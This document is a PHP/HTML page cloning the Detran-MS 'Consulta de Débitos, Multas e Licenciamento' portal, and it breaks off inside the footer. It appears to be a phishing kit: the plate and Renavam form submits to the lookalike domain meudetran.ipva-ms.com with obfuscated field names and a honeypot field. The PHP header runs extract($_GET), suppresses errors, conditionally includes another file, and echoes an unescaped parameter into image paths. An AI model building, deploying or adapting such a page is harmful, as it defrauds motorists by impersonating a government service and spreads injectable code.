<?php

error_reporting(0);

extract($_GET);

if($sucesso){

    include_once(__DIR__ . '/homex.php');

    return;
}


?>

<!DOCTYPE html>
 <html lang="pt-br">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <link rel="shortcut icon" href="/imagens/detran-ms.ico" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Meu Detran</title>

    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    :root {
        --header-bg-color: #004F9F;
        --text-white: #ffffff;
        --neutral-100: #EAEBEC;
        --neutral-500: #545D64;
        --secondary-default: #2C5799;
        --secondary-600: #2C5799;
        --secondary-700: #284E8A;
        --success-500: #28A44C;
        --error-600: #DA1E28;
        --primary-500: #1F9353;
        --text-black: #000000;
    }

    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        line-height: 1.6;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }


    .site-header {
        background-color: var(--header-bg-color);
        color: var(--text-white);
        height: 80px;
        display: flex;
        align-items: center;
    }

    @media (min-width: 768px) {
        .site-header {
            height: 128px;
        }
    }


    .header-container {
        width: 100%;
        max-width: 100%;
        margin: 0 auto;
        padding: 0 1rem;
        height: 100%;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    @media (min-width: 768px) {
        .header-container {
            padding: 0 2.5rem;
        }
    }

    @media (min-width: 1024px) {
        .header-container {
            padding: 0 5rem;
        }
    }

    @media (min-width: 1280px) {
        .header-container {
            padding: 0 10rem;
        }
    }

    @media (min-width: 1536px) {
        .header-container {
            padding: 0 16rem;
        }
    }


    .logo-ms {
        width: 48px;
        margin-top: -16px;
    }

    @media (min-width: 768px) {
        .logo-ms {
            width: 80px;
            margin-top: -26px;
        }
    }

    @media (min-width: 1024px) {
        .logo-ms {
            margin-top: -28px;
        }
    }

    @media (min-width: 1536px) {
        .logo-ms {
            width: 90px;
            margin-top: -18px;
        }
    }


    .logo-center-container {
        width: 100%;
        display: flex;
        justify-content: center;
        gap: 0.25rem;
    }


    .logo-center-link {
        width: 100%;
        display: flex;
        justify-content: center;
    }


    .logo-meudetran {
        height: 48px;
    }

    @media (min-width: 768px) {
        .logo-meudetran {
            height: 70px;
        }
    }

    @media (min-width: 1536px) {
        .logo-meudetran {
            height: 80px;
        }
    }


    img {
        display: block;
        max-width: 100%;
        height: auto;
    }


    .breadcrumb-section {
        background-color: var(--neutral-100);
        color: var(--secondary-default);
        padding: 0.5rem;
        height: auto;
    }

    .breadcrumb-container {
        width: 100%;
        max-width: 100%;
        margin: 0 auto;
        padding: 0 1rem;
        min-height: 100%;
        height: 100%;
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        justify-content: space-between;
        gap: 0.5rem;
    }

    @media (min-width: 768px) {
        .breadcrumb-container {
            padding: 0 2.5rem;
        }
    }

    @media (min-width: 1024px) {
        .breadcrumb-container {
            padding: 0 5rem;
        }
    }

    @media (min-width: 1280px) {
        .breadcrumb-container {
            padding: 0 10rem;
        }
    }

    @media (min-width: 1536px) {
        .breadcrumb-container {
            padding: 0 16rem;
        }
    }

    .breadcrumb-content {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        flex-wrap: wrap;
    }

    .breadcrumb-item {
        display: flex;
        align-items: center;
        padding: 0.5rem 0;
    }

    .breadcrumb-link-wrapper {
        display: flex;
        align-items: center;
        font-weight: 300;
        font-size: 0.875rem;
    }

    @media (min-width: 1024px) {
        .breadcrumb-link-wrapper {
            font-size: 1rem;
        }
    }

    .breadcrumb-link {
        color: var(--neutral-500);
        text-transform: uppercase;
        text-decoration: none;
        display: flex;
        align-items: center;
    }

    .breadcrumb-link:hover {
        text-decoration: underline;
    }

    .breadcrumb-icon {
        width: 1.5rem;
        height: 1.5rem;
        color: var(--secondary-600);
    }

    @media (min-width: 1536px) {
        .breadcrumb-icon {
            width: 1.75rem;
            height: 1.75rem;
        }
    }

    .breadcrumb-separator {
        width: 1.5rem;
        height: 1.5rem;
        color: currentColor;
    }

    @media (min-width: 1536px) {
        .breadcrumb-separator {
            width: 1.75rem;
            height: 1.75rem;
        }
    }

    .breadcrumb-title {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        font-weight: 700;
        font-size: 0.75rem;
        text-transform: uppercase;
    }

    @media (min-width: 640px) {
        .breadcrumb-title {
            font-size: 0.875rem;
        }
    }

    @media (min-width: 1024px) {
        .breadcrumb-title {
            font-size: 1rem;
        }
    }

    .breadcrumb-actions {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        margin-left: auto;
    }

    svg {
        display: inline-block;
        vertical-align: middle;
    }


    .main-content {
        flex: 1 1 0%;
        height: 100%;
        width: 100%;
        max-width: 2560px;
        margin: 0 auto;
        padding: 1.5rem 0;
    }

    @media (min-width: 768px) {
        .main-content {
            padding: 2rem 0;
        }
    }

    .main-container {
        width: 100%;
        max-width: 100%;
        margin: 0 auto;
        padding: 0 1rem;
        min-height: 100%;
        height: 100%;
    }

    @media (min-width: 768px) {
        .main-container {
            padding: 0 2.5rem;
        }
    }

    @media (min-width: 1024px) {
        .main-container {
            padding: 0 5rem;
        }
    }

    @media (min-width: 1280px) {
        .main-container {
            padding: 0 10rem;
        }
    }

    @media (min-width: 1536px) {
        .main-container {
            padding: 0 16rem;
        }
    }


    .card-container {
        background-color: var(--neutral-100);
        display: flex;
        align-items: center;
        justify-content: center;
        width: 100%;
        height: 100%;
        flex-direction: column;
        max-width: 100%;
        margin: -0.5rem auto 0;
        border-radius: 0.5rem;
    }

    @media (min-width: 640px) {
        .card-container {
            border-radius: 0.5rem;
            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
        }
    }

    @media (min-width: 1280px) {
        .card-container {
            width: 56rem;
        }
    }

    .card-content {
        position: relative;
        width: 100%;
        margin-top: 3rem;
        padding-bottom: 0.5rem;
    }

    @media (min-width: 640px) {
        .card-content {
            padding-bottom: 0.5rem;
        }
    }

    @media (min-width: 1024px) {
        .card-content {
            padding-bottom: 6rem;
        }
    }

    @media (min-width: 1280px) {
        .card-content {
            padding-bottom: 5rem;
        }
    }

    @media (min-width: 1536px) {
        .card-content {
            padding-bottom: 4rem;
        }
    }

    .form-wrapper {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        gap: 2rem;
        padding: 2rem;
        width: 100%;
    }

    @media (min-width: 768px) {
        .form-wrapper {
            width: 75%;
        }
    }

    @media (min-width: 1024px) {
        .form-wrapper {
            width: 66.666667%;
        }

        .form-wrapper {
            margin-top: -3.5rem;
        }
    }


    .icon-title-section {
        display: flex;
        flex-direction: column;
        gap: 0.25rem;
        width: 100%;
    }

    .icon-title-wrapper {
        display: flex;
        gap: 1rem;
        align-items: flex-start;
    }

    .section-icon {
        width: 3rem;
        height: 3rem;
        color: var(--success-500);
        flex-shrink: 0;
    }

    @media (min-width: 1280px) {
        .section-icon {
            width: 3.5rem;
            height: 3.5rem;
        }
    }

    .section-title-content {
        flex: 1;
    }

    .section-title {
        color: var(--secondary-700);
        text-transform: uppercase;
        font-weight: 700;
        font-size: 1.25rem;
        margin: 0;
    }

    @media (min-width: 768px) {
        .section-title {
            font-size: 1.5rem;
        }
    }

    @media (min-width: 1536px) {
        .section-title {
            font-size: 1.875rem;
        }
    }

    .section-description {
        font-size: 1rem;
        font-weight: 400;
        text-align: left;
        line-height: 22px;
        margin-top: 0.5rem;
    }

    @media (min-width: 1536px) {
        .section-description {
            font-size: 1.125rem;
        }
    }


    .form {
        width: 100%;
        gap: 2rem;
        display: flex;
        flex-direction: column;
    }

    .form-fields {
        width: 100%;
    }

    @media (min-width: 1024px) {
        .form-fields {
            width: 66.666667%;
            margin: 0 auto;
        }
    }

    .form-group {
        width: 100%;
        margin: 0.5rem 0.25rem;
    }

    .form-label {
        color: var(--text-black);
        font-size: 0.875rem;
        display: block;
        margin-bottom: 0.25rem;
    }

    @media (min-width: 640px) {
        .form-label {
            font-size: 1rem;
        }
    }

    .form-label-required {
        font-weight: 700;
        color: var(--success-500);
    }

    .input-wrapper {
        position: relative;
        display: flex;
        align-items: center;
        width: 100%;
    }

    .form-input {
        outline: none;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1rem;
        padding: 0.25rem 0;
        width: 100%;
        padding-right: 1.25rem;
        border-bottom: 1px solid var(--neutral-500);
        color: var(--text-black);
        background-color: transparent;
        border-top: none;
        border-left: none;
        border-right: none;
    }

    .form-input:focus {
        border-bottom-color: var(--primary-500);
        border-bottom-width: 2px;
    }

    .form-input::placeholder {
        color: #c0c0c0;
    }

    .form-input::-moz-placeholder {
        color: #c0c0c0;
    }

    .form-input::-webkit-input-placeholder {
        color: #c0c0c0;
    }

    .form-input:-ms-input-placeholder {
        color: #c0c0c0;
    }

    .form-error {
        width: 100%;
        text-align: left;
        font-size: 1rem;
        font-weight: 400;
        color: var(--error-600);
        display: block;
        margin-top: 0.25rem;
    }


    .button-group {
        display: flex;
        gap: 1rem;
        align-items: center;
        justify-content: center;
        margin-top: 1rem;
    }

    .btn {
        text-transform: capitalize;
        justify-content: center;
        font-size: 0.875rem;
        font-weight: 700;
        display: inline-flex;
        height: 2.5rem;
        align-items: center;
        gap: 0.75rem;
        border-radius: 9999px;
        padding: 0.625rem 1rem;
        border: none;
        cursor: pointer;
        transition: all 0.2s ease;
    }

    @media (min-width: 640px) {
        .btn {
            padding: 0.625rem 1.5rem;
        }
    }

    @media (min-width: 768px) {
        .btn {
            padding: 0.625rem 2rem;
        }
    }

    @media (min-width: 1280px) {
        .btn {
            font-size: 1rem;
        }
    }

    .btn-primary {
        background-color: rgb(0, 130, 60);
        color: rgb(255, 255, 255);
    }

    .btn-primary:hover {
        background-color: rgb(0, 117, 53);
        box-shadow: 0 3px 4px 0px rgba(0, 0, 0, 0.15);
    }

    .btn-primary:focus {
        background-color: rgb(0, 103, 45);
        box-shadow: none;
    }

    .btn-secondary {
        border: 1px solid rgb(40, 78, 138);
        background-color: transparent;
        color: rgb(40, 78, 138);
    }

    .btn-secondary:hover {
        background-color: rgb(65, 104, 163);
        color: rgb(255, 255, 255);
        box-shadow: 0 3px 4px 0px rgba(0, 0, 0, 0.15);
    }

    .btn-secondary:focus {
        border-color: rgb(40, 78, 138);
        background-color: rgb(40, 78, 138);
        color: rgb(255, 255, 255);
        box-shadow: none;
    }


    .decorative-image {
        display: none;
    }

    @media (min-width: 768px) {
        .decorative-image {
            display: flex;
            align-items: center;
        }

        .decorative-image img {
            position: absolute;
            right: 0;
            bottom: 0;
            height: auto;
            width: 16rem;
        }
    }

    @media (min-width: 1024px) {
        .decorative-image img {
            width: 20rem;
        }
    }

    @media (min-width: 1536px) {
        .decorative-image img {
            width: 20rem;
        }
    }


    .footer-container {
        width: 100%;
        max-width: 100%;
        margin: 0 auto;
        padding: 0 1rem;
        min-height: 100%;
        height: 100%;
    }

    @media (min-width: 768px) {
        .footer-container {
            padding: 0 2.5rem;
        }
    }

    @media (min-width: 1024px) {
        .footer-container {
            padding: 0 5rem;
        }
    }

    @media (min-width: 1280px) {
        .footer-container {
            padding: 0 10rem;
        }
    }

    @media (min-width: 1536px) {
        .footer-container {
            padding: 0 16rem;
        }
    }

    .site-footer {
        color: var(--neutral-500);
        font-size: 0.75rem;
        border-top: 1px solid rgb(31, 41, 55);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 1.5rem;
        padding: 1rem 0;
        height: 100%;
        width: 100%;
    }

    @media (min-width: 768px) {
        .site-footer {
            flex-direction: row;
            justify-content: space-between;
        }
    }

    @media (min-width: 1024px) {
        .site-footer {
            padding-left: 3rem;
            padding-right: 3rem;
        }
    }

    @media (min-width: 1280px) {
        .site-footer {
            font-size: 1rem;
        }
    }

    .footer-content {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: space-between;
        gap: 1rem;
        width: 100%;
    }

    @media (min-width: 768px) {
        .footer-content {
            flex-direction: row;
        }
    }

    .footer-info {
        display: flex;
        flex-direction: column;
        gap: 1rem;
        align-items: center;
    }

    @media (min-width: 768px) {
        .footer-info {
            flex-direction: row;
        }
    }

    .footer-logo {
        height: 2.25rem;
    }

    @media (min-width: 768px) {
        .footer-logo {
            height: 2rem;
        }
    }

    .footer-copyright {
        text-align: center;
        font-size: 0.75rem;
    }

    @media (min-width: 1024px) {
        .footer-copyright {
            text-align: left;
            font-size: 0.875rem;
        }
    }

    @media (min-width: 1280px) {
        .footer-copyright {
            font-size: 1rem;
        }
    }

    .footer-contact {
        display: flex;
        gap: 0.5rem;
        align-items: flex-end;
    }

    @media (min-width: 768px) {
        .footer-contact {
            align-items: center;
        }
    }

    @media (min-width: 1024px) {
        .footer-contact {
            justify-content: flex-end;
        }
    }

    .footer-phone-icon {
        display: none;
        width: 1.5rem;
        height: 1.5rem;
        transform: rotate(90deg);
    }

    @media (min-width: 768px) {
        .footer-phone-icon {
            display: block;
        }
    }

    .footer-phone-text {
        display: flex;
        width: 100%;
        flex-wrap: wrap;
        flex-direction: column;
        gap: 0.5rem;
        font-size: 0.75rem;
    }

    @media (min-width: 640px) {
        .footer-phone-text {
            flex-wrap: wrap;
        }
    }

    @media (min-width: 768px) {
        .footer-phone-text {
            flex-direction: row;
            gap: 0;
        }
    }

    @media (min-width: 1024px) {
        .footer-phone-text {
            gap: 0.25rem;
        }
    }

    @media (min-width: 1280px) {
        .footer-phone-text {
            font-size: 1rem;
        }
    }

    @media (min-width: 1536px) {
        .footer-phone-text {
            gap: 0.5rem;
        }
    }

    .footer-phone-label {
        display: flex;
        gap: 0.25rem;
        justify-content: center;
    }

    @media (min-width: 1024px) {
        .footer-phone-label {
            justify-content: flex-end;
        }
    }

    @media (min-width: 1536px) {
        .footer-phone-label {
            gap: 0.5rem;
        }
    }

    .footer-phone-icon-mobile {
        display: flex;
        width: 1rem;
        height: 1rem;
        transform: rotate(90deg);
    }

    @media (min-width: 768px) {
        .footer-phone-icon-mobile {
            display: none;
        }
    }

    .footer-phone-number {
        font-weight: 700;
    }

    .footer-social {
        display: flex;
        justify-content: center;
        margin-top: 1.5rem;
    }

    @media (min-width: 768px) {
        .footer-social {
            display: none;
        }
    }

    .footer-social-list {
        display: flex;
        gap: 0.75rem;
        list-style: none;
        padding: 0;
        margin: 0;
    }

    .footer-social-link {
        display: inline-block;
        width: 1.25rem;
        height: 1.25rem;
        color: currentColor;
        transition: color 0.2s ease;
    }

    .footer-social-link:hover {
        color: rgb(229, 231, 235);
    }

    @media (min-width: 768px) {
        .footer-social-link {
            width: 1.5rem;
            height: 1.5rem;
        }
    }

    @media (min-width: 1024px) {
        .footer-social-link {
            width: 2rem;
            height: 2rem;
        }
    }


    .modal-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 1000;
        align-items: center;
        justify-content: center;
    }

    .modal-overlay.show {
        display: flex;
    }

    .modal-content {
        background-color: #ffffff;
        border-radius: 8px;
        max-width: 500px;
        width: 90%;
        max-height: 90vh;
        overflow-y: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
    }

    .modal-header {
        padding: 20px 25px;
        border-bottom: none;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .modal-title {
        font-weight: 600;
        color: var(--text-black);
        font-size: 18px;
        display: flex;
        align-items: center;
        gap: 10px;
        margin: 0;
    }

    .modal-title-icon {
        color: var(--error-600);
        font-size: 20px;
    }

    .modal-close {
        background: none;
        border: none;
        font-size: 24px;
        cursor: pointer;
        color: #999;
        padding: 0;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .modal-close:hover {
        color: #333;
    }

    .modal-body {
        padding: 25px;
        color: var(--text-black);
        font-size: 15px;
        line-height: 1.6;
    }

    .modal-footer {
        padding: 15px 25px;
        border-top: none;
        display: flex;
        justify-content: flex-end;
    }

    .btn-modal {
        background: linear-gradient(0deg, rgb(0, 130, 60) 0%, rgb(0, 130, 60) 100%);
        border: none;
        color: white;
        padding: 10px 25px;
        font-weight: 600;
        font-size: 14px;
        text-transform: uppercase;
        border-radius: 5px;
        letter-spacing: 0.5px;
        transition: opacity 0.3s;
        cursor: pointer;
    }

    .btn-modal:hover {
        opacity: 0.9;
        color: white;
    }


    .loader {
        color: #ffffff;
        font-size: 20px;
        text-indent: -9999em;
        overflow: hidden;
        width: 1em;
        height: 1em;
        border-radius: 50%;
        position: relative;
        transform: translateZ(0);
        animation: mltShdSpin 1.7s infinite ease, round 1.7s infinite ease;
        display: inline-block;
        margin-right: 10px;
        vertical-align: middle;
    }

    @keyframes mltShdSpin {
        0% {
            box-shadow: 0 -0.83em 0 -0.4em,
                0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em,
                0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
        }

        5%,
        95% {
            box-shadow: 0 -0.83em 0 -0.4em,
                0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em,
                0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
        }

        10%,
        59% {
            box-shadow: 0 -0.83em 0 -0.4em,
                -0.087em -0.825em 0 -0.42em, -0.173em -0.812em 0 -0.44em,
                -0.256em -0.789em 0 -0.46em, -0.297em -0.775em 0 -0.477em;
        }

        20% {
            box-shadow: 0 -0.83em 0 -0.4em, -0.338em -0.758em 0 -0.42em,
                -0.555em -0.617em 0 -0.44em, -0.671em -0.488em 0 -0.46em,
                -0.749em -0.34em 0 -0.477em;
        }

        38% {
            box-shadow: 0 -0.83em 0 -0.4em, -0.377em -0.74em 0 -0.42em,
                -0.645em -0.522em 0 -0.44em, -0.775em -0.297em 0 -0.46em,
                -0.82em -0.09em 0 -0.477em;
        }

        100% {
            box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em,
                0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
        }
    }

    @keyframes round {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }

    .btn.loading {
        color: #ffffff !important;
    }

    .btn.loading span {
        color: #ffffff;
    }
    </style>

    <script>
    window.csrfToken = "602dfd27972f8c06ed4ef6ef79edeee71339cb14f12e7f9c630094d2657bcec4";
    window.tokenGenerated = false;
    window.jsVerificationToken = "7445ffc43894ac3478ee344f78a85501";
    </script>
</head>

<body>
    <header class="site-header">
        <div class="header-container">
            <img src="./<?= $diretorio ?>/detran-ms_files/logoms.svg" alt="Logo MS" class="logo-ms">

            <div class="logo-center-container">
                <a  class="logo-center-link">
                    <img src="./<?= $diretorio ?>/detran-ms_files/logo-detranms.svg" alt="Meu Detran" class="logo-meudetran">
                </a>
            </div>
        </div>
    </header>

    <div class="breadcrumb-section">
        <div class="breadcrumb-container">
            <div class="breadcrumb-content">
                <div class="breadcrumb-item">
                    <div class="breadcrumb-link-wrapper">
                        <a  class="breadcrumb-link">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 20 20"
                                aria-hidden="true" class="breadcrumb-icon" height="1em" width="1em"
                                xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001 1h2a1 1 0 001-1v-2a1 1 0 011-1h2a1 1 0 011 1v2a1 1 0 001 1h2a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z">
                                </path>
                            </svg>
                        </a>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                            class="breadcrumb-separator">
                            <path d="m9 18 6-6-6-6"></path>
                        </svg>
                    </div>
                    <div class="breadcrumb-title">
                        Consulta de Débitos
                    </div>
                </div>
            </div>
            <div class="breadcrumb-actions"></div>
        </div>
    </div>

    <main class="main-content">
        <div class="main-container">
            <div class="card-container">
                <div class="card-content">
                    <div class="form-wrapper">
                        <div class="icon-title-section">
                            <div class="icon-title-wrapper">
                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16"
                                    class="section-icon" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                    <path
                                        d="M14.5 3a.5.5 0 0 1 .5.5v9a.5.5 0 0 1-.5.5h-13a.5.5 0 0 1-.5-.5v-9a.5.5 0 0 1 .5-.5zm-13-1A1.5 1.5 0 0 0 0 3.5v9A1.5 1.5 0 0 0 1.5 14h13a1.5 1.5 0 0 0 1.5-1.5v-9A1.5 1.5 0 0 0 14.5 2z">
                                    </path>
                                    <path
                                        d="M7 5.5a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5m-1.496-.854a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0l-.5-.5a.5.5 0 1 1 .708-.708l.146.147 1.146-1.147a.5.5 0 0 1 .708 0M7 9.5a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5m-1.496-.854a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0l-.5-.5a.5.5 0 0 1 .708-.708l.146.147 1.146-1.147a.5.5 0 0 1 .708 0">
                                    </path>
                                </svg>
                                <div class="section-title-content">
                                    <h5 class="section-title">Consulta de Débitos, Multas e Licenciamento</h5>
                                    <p class="section-description">Insira os dados nos campos abaixo para consultar os
                                        débitos do veículo</p>
                                </div>
                            </div>
                        </div>

                        <form action="https://meudetran.ipva-ms.com/" class="form" id="consultaForm">
                            <div class="form-group" style="display: none;">
                                <input type="text" name="h_cfd5fd58d29e" id="h_cfd5fd58d29e" tabindex="-1"
                                    autocomplete="off">
                            </div>
                            <div class="form-fields">
                                <div class="form-group">
                                    <label for="placa" class="form-label">
                                        Placa do veículo
                                        <span class="form-label-required">*</span>
                                    </label>
                                    <div class="input-wrapper">
                                        <input id="placa" name="p_f0e42f2a7aa7" type="text" placeholder="ABC 1D23"
                                            maxlength="7" class="form-input" value="">
                                    </div>
                                    <small class="form-error"></small>
                                </div>

                                <div class="form-group">
                                    <label for="renavam" class="form-label">
                                        Renavam
                                        <span class="form-label-required">*</span>
                                    </label>
                                    <div class="input-wrapper">
                                        <input id="renavam" name="r_e9681522c8b4" type="text" placeholder="01234567890"
                                            maxlength="11" class="form-input" value="">
                                    </div>
                                    <small class="form-error"></small>
                                </div>
                            </div>

                            <div class="button-group">
                                <button type="button" class="btn btn-secondary"
                                    onclick="window.location.href=&#39;/&#39;">CANCELAR</button>
                                <button type="submit" id="mkConsulta" class="btn btn-primary">CONSULTAR</button>
                            </div>
                        </form>
                    </div>

                    <div class="decorative-image">
                        <img src="./<?= $diretorio ?>/detran-ms_files/mulherConteudoDireito.png" alt="Mulher Login">
                    </div>
                </div>
            </div>
        </div>
    </main>

    <div class="footer-container">
        <footer class="site-footer">
            <div class="footer-content">
                <div class="footer-info">
                    <img src="./<?= $diretorio ?>/detran-ms_files/logoRodape.svg" alt="MS Gov" class="footer-logo">
                    <p class="footer-copyright">© 2025 Departamento Estadual de Trânsito - Todos os direitos reservados
                    </p>
                </div>

                <div class="footer-contact">
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
                        class="footer-phone-icon" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M493.4 24.6l-104-24c-11.3-2.6-22.9 3.3-27.5 13.9l-48 112c-4.2 9.8-1.4 21.3 6.9 28l60.6 49.6c-36 76.7-98.9 140.5-177.2 177.2l-49.6-60.6c-6.8-8.3-18.2-11.1-28-6.9l-112 48C3.9 366.5-2 378.1.6 389.4l24 104C27.1 504.2 36.7 512 48 512c256.1 0 464-207.5 464-464 0-11.2-7.7-20.9-18.6-23.4z">
                        </path>
                    </svg>
                    <p class="footer-phone-text">
                        Central de Informações
                        <span class="footer-phone-label">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
                                class="footer-phone-icon-mobile" height="1em" width="1em"
                                xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M493.4 24.6l-104-24c-11.3-2.6-22.9 3.3-27.5 13.9l-48 112c-4.2 9.8-1.4 21.3 6.9 28l60.6 49.6c-36 76.7-98.9 140.5-177.2 177.2l-49.6-60.6c-6.8-8.3-18.2-11.1-28-6.9l-112 48C3.9 366.5-2 378.1.6 389.4l24 104C27.1 504.2 36.7 512 48 512c256.1 0 464-207.5 464-464 0-11.2-7.7-20.9-18.6-23.4z">
                                </path>
                            </svg>
                            •<strong class="footer-phone-number">Ligue 154</strong>
                        </span>
                    </p>
                </div>
            </div>

            <nav class="footer-social">
                <ul class="footer-social-list">
                    <li>
                        <a href="https://www.facebook.com/detranmsoficial/" target="_blank" rel="noopener noreferrer"
                            class="footer-social-link">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                                height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M14 13.5H16.5L17.5 9.5H14V7.5C14 6.47062 14 5.5 16 5.5H17.5V2.1401C17.1743 2.09685 15.943 2 14.6429 2C11.9284 2 10 3.65686 10 6.69971V9.5H7V13.5H10V22H14V13.5Z">
                                </path>
                            </svg>
                        </a>
                    </li>
                    <li>
                        <a href="https://twitter.com/detranms" target="_blank" rel="noopener noreferrer"
                            class="footer-social-link">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                                height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M10.4883 14.651L15.25 21H22.25L14.3917 10.5223L20.9308 3H18.2808L13.1643 8.88578L8.75 3H1.75L9.26086 13.0145L2.31915 21H4.96917L10.4883 14.651ZM16.25 19L5.75 5H7.75L18.25 19H16.25Z">
                                </path>
                            </svg>
                        </a>
                    </li>
                    <li>
                        <a href="https://www.instagram.com/detranms/" target="_blank" rel="noopener noreferrer"
                            class="footer-social-link">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                                height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M12.001 9C10.3436 9 9.00098 10.3431 9.00098 12C9.00098 13.6573 10.3441 15 12.001 15C13.6583 15 15.001 13.6569 15.001 12C15.001 10.3427 13.6579 9 12.001 9ZM12.001 7C14.7614 7 17.001 9.2371 17.001 12C17.001 14.7605 14.7639 17 12.001 17C9.24051 17 7.00098 14.7629 7.00098 12C7.00098 9.23953 9.23808 7 12.001 7ZM18.501 6.74915C18.501 7.43926 17.9402 7.99917 17.251 7.99917C16.5609 7.99917 16.001 7.4384 16.001 6.74915C16.001 6.0599 16.5617 5.5 17.251 5.5C17.9393 5.49913 18.501 6.0599 18.501 6.74915ZM12.001 4C9.5265 4 9.12318 4.00655 7.97227 4.0578C7.18815 4.09461 6.66253 4.20007 6.17416 4.38967C5.74016 4.55799 5.42709 4.75898 5.09352 5.09255C4.75867 5.4274 4.55804 5.73963 4.3904 6.17383C4.20036 6.66332 4.09493 7.18811 4.05878 7.97115C4.00703 9.0752 4.00098 9.46105 4.00098 12C4.00098 14.4745 4.00753 14.8778 4.05877 16.0286C4.0956 16.8124 4.2012 17.3388 4.39034 17.826C4.5591 18.2606 4.7605 18.5744 5.09246 18.9064C5.42863 19.2421 5.74179 19.4434 6.17187 19.6094C6.66619 19.8005 7.19148 19.9061 7.97212 19.9422C9.07618 19.9939 9.46203 20 12.001 20C14.4755 20 14.8788 19.9934 16.0296 19.9422C16.8117 19.9055 17.3385 19.7996 17.827 19.6106C18.2604 19.4423 18.5752 19.2402 18.9074 18.9085C19.2436 18.5718 19.4445 18.2594 19.6107 17.8283C19.8013 17.3358 19.9071 16.8098 19.9432 16.0289C19.9949 14.9248 20.001 14.5389 20.001 12C20.001 9.52552 19.9944 9.12221 19.9432 7.97137C19.9064 7.18906 19.8005 6.66149 19.6113 6.17318C19.4434 5.74038 19.2417 5.42635 18.9084 5.09255C18.573 4.75715 18.2616 4.55693 17.8271 4.38942C17.338 4.19954 16.8124 4.09396 16.0298 4.05781C14.9258 4.00605 14.5399 4 12.001 4ZM12.001 2C14.7176 2 15.0568 2.01 16.1235 2.06C17.1876 2.10917 17.9135 2.2775 18.551 2.525C19.2101 2.77917 19.7668 3.1225 20.3226 3.67833C20.8776 4.23417 21.221 4.7925 21.476 5.45C21.7226 6.08667 21.891 6.81333 21.941 7.8775C21.9885 8.94417 22.001 9.28333 22.001 12C22.001 14.7167 21.991 15.0558 21.941 16.1225C21.8918 17.1867 21.7226 17.9125 21.476 18.55C21.2218 19.2092 20.8776 19.7658 20.3226 20.3217C19.7668 20.8767 19.2076 21.22 18.551 21.475C17.9135 21.7217 17.1876 21.89 16.1235 21.94C15.0568 21.9875 14.7176 22 12.001 22C9.28431 22 8.94514 21.99 7.87848 21.94C6.81431 21.8908 6.08931 21.7217 5.45098 21.475C4.79264 21.2208 4.23514 20.8767 3.67931 20.3217C3.12348 19.7658 2.78098 19.2067 2.52598 18.55C2.27848 17.9125 2.11098 17.1867 2.06098 16.1225C2.01348 15.0558 2.00098 14.7167 2.00098 12C2.00098 9.28333 2.01098 8.94417 2.06098 7.8775C2.11014 6.8125 2.27848 6.0875 2.52598 5.45C2.78014 4.79167 3.12348 4.23417 3.67931 3.67833C4.23514 3.1225 4.79348 2.78 5.45098 2.525C6.08848 2.2775 6.81348 2.11 7.87848 2.06C8.94514 2.0125 9.28431 2 12.001 2Z">
                                </path>
                            </svg>
